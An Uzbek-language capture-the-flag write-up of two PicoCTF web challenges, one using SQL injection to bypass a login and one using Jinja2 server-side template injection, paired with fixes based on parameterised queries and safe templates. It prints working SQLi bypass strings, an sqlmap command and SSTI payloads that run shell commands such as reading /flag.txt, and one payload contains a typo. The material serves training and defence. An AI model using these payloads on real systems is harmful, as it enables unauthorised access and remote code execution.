# 💉 Server-Side Attack Challenges

> **Kategoriya:** Web Exploitation — Server-Side Attacks  
> **Challenges:** Crack the Gate 1 · SSTI1  
> **Daraja:** Intermediate  
> **Muallif:** [Anonymous]
---

## Umumiy tushuncha

Server-side hujumlar — foydalanuvchi kiritgan ma'lumot server tomonida xavfli tarzda ishlatilganda yuzaga keladigan zaifliklar. Bu kategoriya eng xavfli web zaifliklarni o'z ichiga oladi, chunki to'g'ri exploit qilinsa server ustidan to'liq nazorat qo'lga kiritilishi mumkin.

---

## 1. Crack the Gate 1

### 📋 Challenge tavsifi
Login forma mavjud. Foydalanuvchi nomi va parol bazaga SQL so'rovi orqali tekshiriladi. Agar input to'g'ri sanitize qilinmagan bo'lsa, biz SQL so'rovini buzib, parolsiz kirish imkonini olamiz — bu **SQL Injection** deyiladi.

### 🔧 SQL Injection nima?

Oddiy login SQL so'rovi quyidagicha ko'rinadi:
```sql
SELECT * FROM users 
WHERE username = 'INPUT_USERNAME' 
  AND password = 'INPUT_PASSWORD';
```

Agar biz username maydoniga quyidagini kiritamiz:
```
admin' --
```

So'rov shunday bo'lib qoladi:
```sql
SELECT * FROM users 
WHERE username = 'admin' --' AND password = '...';
--  ^ bu yerdan keyin hammasi comment bo'ladi!
```

Natija: parol tekshirilmaydi, `admin` foydalanuvchisi sifatida kirdik!

### 🔍 Yechim jarayoni

**1-qadam — Login formaga o'tamiz.**

**2-qadam — SQL injection ni sinab ko'ramiz:**

Username maydoniga:
```
' OR 1=1 --
```
Password: (ixtiyoriy)

**Bu nima qiladi?**
```sql
-- Asl so'rov:
WHERE username = '' OR 1=1 --' AND password = '...'

-- 1=1 har doim TRUE → barcha foydalanuvchilar qaytadi
-- -- dan keyingisi comment → parol tekshirilmaydi
```

**3-qadam — Muayyan foydalanuvchi sifatida kirish:**
```sql
-- Username:
admin' --

-- Yoki:
' OR '1'='1

-- Yoki (klassik):
' OR 1=1 LIMIT 1 --
```

**4-qadam — Flag paydo bo'ldi! ✅**

**Agar oddiy payload ishlamasa — ko'proq variantlar:**
```sql
" OR 1=1 --          ← double quote
' OR '1'='1' --      ← string comparison
') OR ('1'='1        ← bracket injection
admin'/*             ← MySQL comment
```

**Burp Suite bilan:**
1. Proxy → Intercept
2. Login so'rovini ushlaymiz
3. `username=admin'+OR+1%3D1+--&password=x` ko'rinishda o'zgartiramiz

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| Browser | Manuel SQL injection |
| Burp Suite | Request interception va manipulation |
| `sqlmap` | Avtomatik SQL injection (agar ruxsat bo'lsa) |

```bash
# sqlmap bilan (ruxsat bo'lganda):
sqlmap -u "http://site/login" \
  --data="username=admin&password=pass" \
  --level=3 --risk=2 --dbs
```

### 💡 Xulosa va o'rganilgan narsalar
> SQL Injection — OWASP Top 10 ro'yxatida №1 o'rinda turgan zaiflik. Uni oldini olish uchun:
> - **Prepared Statements (Parameterized Queries)** ishlatish
> - **ORM** (Object-Relational Mapping) ishlatish
> - Input sanitization va validation
> - Minimal privilege — DB foydalanuvchisi faqat kerakli huquqlarga ega bo'lsin

**Xavfli kod:**
```python
# ❌ XAVFLI:
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Xavfsiz kod:**
```python
# ✅ XAVFSIZ (Prepared Statement):
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

**OWASP:** A03:2021 – Injection  
**CWE:** CWE-89 – SQL Injection

**Kalit tushunchalar:** SQL Injection, authentication bypass, prepared statements, `sqlmap`

---

## 2. SSTI1

### 📋 Challenge tavsifi
**Server-Side Template Injection (SSTI)** — template engine foydalanuvchi kiritgan ma'lumotni kod sifatida bajarganida yuzaga keladigan zaiflik. Flask/Jinja2, Django, Twig kabi template engine'larda uchraydi.

### 🔧 SSTI nima?

Web ilovalar ko'pincha HTML sahifalarni dinamik yaratish uchun template engine ishlatadi:

```python
# Flask/Jinja2 misoli:
from flask import render_template_string
name = request.args.get('name')
return render_template_string(f"Hello {name}!")
```

Agar `name = "{{7*7}}"` bo'lsa:
- **Xavfsiz:** `Hello {{7*7}}!` — matn sifatida chiqadi
- **SSTI zaif:** `Hello 49!` — kod bajarildi!

### 🔍 Yechim jarayoni

**1-qadam — SSTI borligini aniqlaymiz:**

Input maydoniga yoki URL parametriga kiritamiz:
```
{{7*7}}
```

Agar javob `49` bo'lsa — SSTI mavjud! ✅

**2-qadam — Template engine turini aniqlaymiz:**

```
{{7*'7'}}
```
- Jinja2 → `7777777` (string repeat)
- Twig → `49` (multiplication)
- Freemarker → Error

**3-qadam — Flask/Jinja2 uchun exploit:**

Python obyektlarning zanjiri orqali OS buyruqlarini bajaramiz:

```python
# Config obyektidan secret key ni o'qish (oddiy):
{{config}}

# Class zanjiri orqali OS buyruq bajarish:
{{''.__class__.__mro__[1].__subclasses__()}}

# subprocess bilan buyruq bajarish:
{{''..__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
```

**4-qadam — Flag faylini o'qiymiz:**

```python
# /flag.txt faylini o'qish:
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}

# yoki:
{{''.__class__.__mro__[1].__subclasses__()[40]('/flag.txt').read()}}
```

**5-qadam — Flag! ✅**

**PicoCTF SSTI1 uchun odatda oddiyroq payload ishlaydi:**
```
{{config.items()}}
```
yoki:
```
{{ self.__dict__ }}
```

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| Browser | Manuel SSTI testing |
| Burp Suite | Request manipulation |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) | SSTI payloads reference |

**SSTI aniqlash diagrammasi:**
```
Kiriting: {{7*7}}
    ├── 49 chiqsa → Jinja2/Twig
    ├── Error → Boshqa engine
    └── Hech narsa → Zaif emas

Jinja2 aniqlandi:
    Kiriting: {{7*'7'}}
    ├── 7777777 → Jinja2 (Python)
    └── 49 → Twig (PHP)
```

### 💡 Xulosa va o'rganilgan narsalar
> SSTI — Remote Code Execution (RCE) ga olib kelishi mumkin bo'lgan juda xavfli zaiflik. Oldini olish:
> - Foydalanuvchi kiritgan ma'lumotni hech qachon `render_template_string()` ga to'g'ridan-to'g'ri bermaslik
> - Template'ni alohida `.html` faylda saqlash
> - Input'ni qat'iy sanitize qilish
> - Sandbox mode ishlatish

**Xavfli kod:**
```python
# ❌ XAVFLI:
render_template_string(f"Hello {user_input}!")
```

**Xavfsiz kod:**
```python
# ✅ XAVFSIZ:
render_template("hello.html", name=user_input)
# hello.html ichida: Hello {{ name }}!  ← bu xavfsiz
```

**OWASP:** A03:2021 – Injection  
**CWE:** CWE-94 – Code Injection

**Kalit tushunchalar:** SSTI, Jinja2, template engine, RCE, code injection

---

## 📊 Umumiy xulosa

| Zaiflik | Sabab | Ta'sir | Himoya |
|---------|-------|--------|--------|
| SQL Injection | Input sanitize qilinmagan | DB ma'lumotlari, auth bypass | Prepared statements |
| SSTI | Template string user input'dan | RCE, server nazorati | Alohida template fayl |

### Ikkalasining umumiy sababi
> **Foydalanuvchi kiritgan ma'lumot kod sifatida bajariladi** — bu Injection zaifliklarining asosi. Har doim user input'ni **data** sifatida ko'ring, hech qachon **code** sifatida emas.

### Keyingi qadamlar
- PortSwigger SQL Injection labs
- HackTheBox SSTI challenges
- `sqlmap` toolini o'rganish
- OWASP Testing Guide o'qish

---

*PicoCTF | Web Exploitation | Server-Side Attacks*
